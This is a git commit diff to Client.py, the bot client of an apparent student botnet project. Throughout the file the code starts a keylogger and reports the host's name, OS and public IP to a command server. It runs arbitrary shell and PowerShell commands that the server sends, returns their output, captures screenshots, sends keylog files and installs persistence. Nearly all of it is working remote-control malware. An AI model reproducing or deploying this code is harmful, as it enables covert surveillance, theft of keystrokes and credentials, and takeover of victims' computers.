0e05f53348b13765576454f3393b3be9cb1794ed
Yasir Mehmood <152008995+TheLeopard65@users.noreply.github.com>
2024-03-11 00:19:52 +0500

    Update Client.py

--- Client.py
+++ Client.py
@@ -1,26 +1,60 @@
-import socketio, subprocess, platform, os, socket, threading, datetime
-import  keylogger, persistence
+import socketio, persistence
+import subprocess
+import platform
+import os
+import socket
+import threading
 from requests import post, get
 import pyscreenshot as ImageGrab
+from keylogger import start_keylogger
 
 info = {}
 sio = socketio.Client()
 communication = {}
-persistenceVariable = False
 
 info['COMMAND'] = 'INFO'
 info["hostname"] = socket.gethostname()
 info["OS"] = platform.platform()
-info["IP"] = ip = get('https://api.ipify.org').text
+info["IP"] = get('https://api.ipify.org').text
 
-x = threading.Thread(target=keylogger.startKeylogger)
+x = threading.Thread(target=start_keylogger)
 x.start()
 
-SERVER_ENDPOINT = "http://192.168.100.222:5000/execute_command"
+screenshotNumber = 1
+keyloggerNumber = 1
 
-def execute_command(command):
+def execute_command(bot_id, command):
     try:
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        if not bot_id:
+            command = f"allbots {command}"
+
+        if command.startswith("shell"):
+            args = command.split()[1:]
+            f = "cmd.exe"
+            arg = "/c "
+            for a in args:
+                arg += a + " "
+        elif command.startswith("powershell"):
+            args = command.split()[1:]
+            f = "powershell.exe"
+            arg = "-Command "
+            for a in args:
+                arg += a + " "
+        else:
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, error = process.communicate()
+            output_str = output.decode('utf-8') if output else ""
+            error_str = error.decode('utf-8') if error else ""
+
+            if error_str:
+                result = f"Error: {error_str}"
+            else:
+                result = f"Output: {output_str}"
+
+            send_result_to_server(result)
+            return
+
+        process = subprocess.Popen([f, arg], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         output, error = process.communicate()
         output_str = output.decode('utf-8') if output else ""
         error_str = error.decode('utf-8') if error else ""
@@ -30,10 +64,11 @@ def execute_command(command):
         else:
             result = f"Output: {output_str}"
 
+        send_result_to_server(result)
+
     except Exception as e:
         result = f"Error: {str(e)}"
-
-    send_result_to_server(result)
+        send_result_to_server(result)
 
 def send_result_to_server(result):
     try:
@@ -41,7 +76,7 @@ def send_result_to_server(result):
             "result": result,
         }
 
-        response = post(SERVER_ENDPOINT, json=data)
+        response = post('http://192.168.100.222:5000/execute_command', json=data)
 
         if response.status_code == 200:
             print("Result sent to server successfully")
@@ -55,7 +90,7 @@ def send_result_to_server(result):
 def connect():
     info['sid'] = sio.sid
     sio.send(info)
-    print('connection established')
+    print('SUCCESSFUL CONNECTION ESTABLISHED')
 
 @sio.event
 def message(data):
@@ -69,11 +104,10 @@ def message(data):
     communication['idNum'] = idNum
 
     try:
-        global persistenceVariable
         if len(data) > 0:
             if 'persistence' in data:
                 if not persistenceVariable:
-                    if persistence.tryPersistence():
+                    if persistence.try_persistence():
                         persistenceVariable = True
                         communication['PV'] = persistenceVariable
                         communication['DATA'] = 'Result: Success'
@@ -85,12 +119,15 @@ def message(data):
 
             if 'screenshot' in data:
                 try:
-                    filename = f"screenshot_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
+                    global screenshotNumber
+                    filename = f"screenshot_{screenshotNumber}.png"
+                    screenshot_path = os.path.join(r'./static/receivedData/screenshots', filename)
                     im = ImageGrab.grab()
-                    im.save(os.path.join(r'D:\Air University\Botnet Project\static\receivedData\screenshots', filename))
-                    with open(os.path.join(r'D:\Air University\Botnet Project\static\receivedData\screenshots', filename), 'rb') as f:
+                    im.save(screenshot_path)
+                    with open(screenshot_path, 'rb') as f:
                         communication['DATA'] = f.read()
                         sio.send(communication)
+                    screenshotNumber += 1
                 except Exception as e:
                     print('Error taking Screenshot' + str(e))
                     communication['DATA'] = 'Error taking Screenshot'
@@ -98,11 +135,13 @@ def message(data):
 
             if 'keylogger' in data:
                 try:
-                    filename = f"keylogs_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
-                    with open(os.path.join(r'D:\Air University\Botnet Project\static\receivedData\keylogs', filename), 'r') as f:
+                    global keyloggerNumber
+                    filename = f"keylogs_{keyloggerNumber}.txt"
+                    with open(os.path.join(r'./static/receivedData/keylogs', filename), 'r') as f:
                         keylogger_data = f.read()
                         communication['DATA'] = keylogger_data
                         sio.send(communication)
+                    keyloggerNumber += 1
                 except Exception as e:
                     print(str(e))
                     communication['DATA'] = 'Error getting keylog Data.'
@@ -120,5 +159,6 @@ def disconnect():
     print('disconnected from server')
     sio.send({'COMMAND': 'OUTPUT', 'idNum': info['idNum'], 'commandSent': 'status update', 'DATA': 'Bot is dead'})
 
+print("Connecting to server...")
 sio.connect('http://192.168.100.222:5000')
 sio.wait()
